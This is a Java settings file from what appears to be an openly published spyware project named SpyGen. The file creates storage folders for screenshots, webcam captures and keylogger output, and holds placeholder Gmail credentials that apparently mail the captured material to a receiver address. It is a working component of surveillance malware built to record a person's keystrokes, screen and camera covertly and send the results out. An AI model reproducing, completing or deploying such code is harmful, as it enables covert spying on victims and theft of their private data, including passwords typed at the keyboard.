package com.houarizegai.spygen.global;

import java.io.File;

public class Settings {
    // Path you want to save results
    private static String savePath = "D:";

    /* Mail information */
    public static String senderMail = "sender@gmail.com";
    public static String senderPassword = "sender password (of gmail)";
    public static String receiverMail = "receiver@gmail.com";

    static {
        initSaveFolders();
    }

    private static void initSaveFolders() {
        String directoryName = savePath + "\\SpyGen";
        createFolderIfNotExists(directoryName);
        createFolderIfNotExists(directoryName + "\\screenshots");
        createFolderIfNotExists(directoryName + "\\webcam");
        createFolderIfNotExists(directoryName + "\\keylogger");
    }

    private static void createFolderIfNotExists(String folderPath) {
        File directory = new File(folderPath);
        if (!directory.exists())
            directory.mkdir();
    }

}
